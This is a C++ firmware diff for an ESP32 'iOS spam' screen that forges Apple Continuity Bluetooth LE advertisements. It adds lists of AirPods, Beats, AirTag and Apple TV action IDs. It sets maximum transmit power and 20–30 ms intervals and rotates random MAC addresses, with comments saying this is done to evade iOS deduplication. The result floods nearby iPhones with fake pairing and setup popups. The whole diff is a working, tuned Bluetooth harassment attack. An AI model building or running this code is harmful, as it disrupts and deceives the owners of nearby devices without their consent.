@@ -6,14 +6,58 @@
 
 extern "C" int ble_hs_id_set_rnd(const uint8_t *addr);
 
-// Apple device type IDs for Continuity proximity pairing (IOS1) and setup (IOS2)
-static const uint8_t kIOS1[] = {
-  0x02, 0x0e, 0x0a, 0x0f, 0x13, 0x14, 0x03, 0x0b,
-  0x0c, 0x11, 0x10, 0x05, 0x06, 0x09, 0x17, 0x12, 0x16
+// Apple Continuity ProximityPair device IDs (16-bit, big-endian on the wire)
+static const uint16_t kAppleDevices[] = {
+  0x0E20, // AirPods Pro
+  0x1420, // AirPods Pro 2nd Gen
+  0x2420, // AirPods Pro 2nd Gen USB-C
+  0x2820, // AirPods 4 ANC
+  0x2920, // AirPods 4
+  0x2B20, // AirPods Max USB-C
+  0x0A20, // AirPods Max
+  0x0220, // AirPods
+  0x0F20, // AirPods 2nd Gen
+  0x1320, // AirPods 3rd Gen
+  0x0320, // Powerbeats 3
+  0x0B20, // Powerbeats Pro
+  0x0C20, // Beats Solo Pro
+  0x1120, // Beats Studio Buds
+  0x1020, // Beats Flex
+  0x0520, // Beats X
+  0x0620, // Beats Solo 3
+  0x0920, // Beats Studio 3
+  0x1720, // Beats Studio Pro
+  0x1220, // Beats Fit Pro
+  0x1620, // Beats Studio Buds+
+  0x2520, // Beats Solo 4
+  0x2620, // Beats Solo Buds
+  0x2C20, // Beats Powerbeats Pro 2
+  0x0055, // AirTag
+  0x0030, // Hermes AirTag
 };
-static const uint8_t kIOS2[] = {
-  0x01, 0x06, 0x20, 0x2b, 0xc0, 0x0d, 0x13, 0x27,
-  0x0b, 0x09, 0x02, 0x1e, 0x24
+
+// Apple Continuity NearbyAction action IDs (with flags)
+struct NearbyAction { uint8_t flags; uint8_t action; };
+static const NearbyAction kAppleActions[] = {
+  {0xC0, 0x13}, // AppleTV AutoFill
+  {0xC0, 0x27}, // AppleTV Connecting...
+  {0xC0, 0x20}, // Join This AppleTV?
+  {0xC0, 0x19}, // AppleTV Audio Sync
+  {0xC0, 0x1E}, // AppleTV Color Balance
+  {0xC0, 0x09}, // Setup New iPhone
+  {0xC0, 0x02}, // Transfer Phone Number
+  {0xC0, 0x0B}, // HomePod Setup
+  {0xC0, 0x01}, // Setup New AppleTV
+  {0xC0, 0x06}, // Pair AppleTV
+  {0xC0, 0x0D}, // HomeKit AppleTV Setup
+  {0xC0, 0x2B}, // AppleID for AppleTV?
+  {0xC0, 0x05}, // Apple Watch
+  {0xC0, 0x24}, // Apple Vision Pro
+  {0xC0, 0x2F}, // Connect to other Device
+  {0x40, 0x21}, // Software Update
+  {0xC0, 0x2E}, // Unlock with Apple Watch
+  {0xC0, 0x25}, // AirDrop Sidecar
+  {0xC0, 0x2C}, // Vision Pro Setup
 };
 
 // ── Lifecycle ──────────────────────────────────────────────────────────────
@@ -31,8 +75,16 @@ void BLEiOSSpamScreen::onInit()
   _spam1minFired = false;
 
   NimBLEDevice::init("");
+  NimBLEDevice::setPower(ESP_PWR_LVL_P9, ESP_BLE_PWR_TYPE_ADV);
+  NimBLEDevice::setPower(ESP_PWR_LVL_P9, ESP_BLE_PWR_TYPE_DEFAULT);
   NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
+
   _pAdv = NimBLEDevice::getAdvertising();
+  _pAdv->setAdvertisementType(BLE_GAP_CONN_MODE_UND); // ADV_IND — iOS reacts to connectable
+  _pAdv->setMinInterval(0x20);                        // 20 ms (32 * 0.625)
+  _pAdv->setMaxInterval(0x30);                        // 30 ms (48 * 0.625)
+  _pAdv->setScanResponse(false);
+
   _spam();
 }
 
@@ -53,7 +105,9 @@ void BLEiOSSpamScreen::onUpdate()
     int m = Achievement.inc("ble_ios_spam_1min");
     if (m == 1) Achievement.unlock("ble_ios_spam_1min");
   }
-  if (now - _lastSpamMs >= 100) {
+  // Rotate payload less frequently so the controller pumps many PDUs at 20-30 ms interval
+  // between rotations. ~250 ms gives ~8-12 ADV PDUs per payload across all 3 channels.
+  if (now - _lastSpamMs >= 250) {
     _lastSpamMs = now;
     _spam();
   }
@@ -96,6 +150,7 @@ void BLEiOSSpamScreen::_spam()
 {
   if (_pAdv) _pAdv->stop();
 
+  // Rotate static-random MAC per payload — iOS dedupes identical source addrs
   uint8_t addr[6];
   esp_fill_random(addr, 6);
   addr[5] |= 0xC0;
@@ -105,47 +160,42 @@ void BLEiOSSpamScreen::_spam()
   advData.setFlags(0x06);
 
   if (random(2) == 0) {
-    // SourApple — proximity pairing action popup (0x0F)
-    static constexpr uint8_t kTypes[] = {
-      0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0
-    };
-    uint8_t rand3a[3], rand3b[3];
-    esp_fill_random(rand3a, 3);
-    esp_fill_random(rand3b, 3);
-    // mfg: Apple(2) + type 0x0F + len 0x05 + flags + typeId + rand(3) + 0x00 0x00 0x10 + rand(3) = 15 bytes
-    uint8_t mfg[15] = {
+    // Apple Continuity ProximityPair (type 0x07) — AirPods-style popup.
+    // Layout: 4C 00 | 07 19 | 07 | DEV_HI DEV_LO | 55 | BATT3 | 00 | 00 | RND16
+    //         apple   type+len  prefix  device_id   stat  batt   col  rsv  random
+    uint16_t dev = kAppleDevices[random(sizeof(kAppleDevices) / sizeof(kAppleDevices[0]))];
+    uint8_t  rnd[19];
+    esp_fill_random(rnd, sizeof(rnd));
+
+    uint8_t mfg[29] = {
       0x4C, 0x00,
-      0x0F, 0x05, 0xC1,
-      kTypes[random(sizeof(kTypes))],
-      rand3a[0], rand3a[1], rand3a[2],
-      0x00, 0x00, 0x10,
-      rand3b[0], rand3b[1], rand3b[2]
+      0x07, 0x19,
+      0x07,
+      (uint8_t)(dev >> 8), (uint8_t)(dev & 0xFF),
+      0x55,
+      rnd[0], rnd[1], rnd[2],
+      0x00,
+      0x00,
+      rnd[3],  rnd[4],  rnd[5],  rnd[6],
+      rnd[7],  rnd[8],  rnd[9],  rnd[10],
+      rnd[11], rnd[12], rnd[13], rnd[14],
+      rnd[15], rnd[16], rnd[17], rnd[18]
     };
-    advData.setManufacturerData(std::string((char*)mfg, 15));
+    advData.setManufacturerData(std::string((char*)mfg, sizeof(mfg)));
   } else {
-    // AppleJuice — Continuity proximity pairing / setup popup
-    if (random(2) == 0) {
-      // Proximity pairing (0x07) — triggers AirPods-style popup
-      uint8_t mfg[24] = {
-        0x4C, 0x00,
-        0x07, 0x19, 0x07,
-        kIOS1[random(sizeof(kIOS1))],
-        0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
-        0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
-      };
-      advData.setManufacturerData(std::string((char*)mfg, 24));
-    } else {
-      // Setup popup (0x04) — triggers "Set up new device" style popup
-      uint8_t mfg[21] = {
-        0x4C, 0x00,
-        0x04, 0x04, 0x2a,
-        0x00, 0x00, 0x00,
-        0x0f, 0x05, 0xc1,
-        kIOS2[random(sizeof(kIOS2))],
-        0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00
-      };
-      advData.setManufacturerData(std::string((char*)mfg, 21));
-    }
+    // Apple Continuity NearbyAction (type 0x0F) — action modal popup.
+    // Layout: 4C 00 | 0F 05 | FLAGS | ACTION | RND3
+    const NearbyAction& a = kAppleActions[random(sizeof(kAppleActions) / sizeof(kAppleActions[0]))];
+    uint8_t rnd[3];
+    esp_fill_random(rnd, 3);
+
+    uint8_t mfg[9] = {
+      0x4C, 0x00,
+      0x0F, 0x05,
+      a.flags, a.action,
+      rnd[0], rnd[1], rnd[2]
+    };
+    advData.setManufacturerData(std::string((char*)mfg, sizeof(mfg)));
   }
 
   _pAdv->setAdvertisementData(advData);
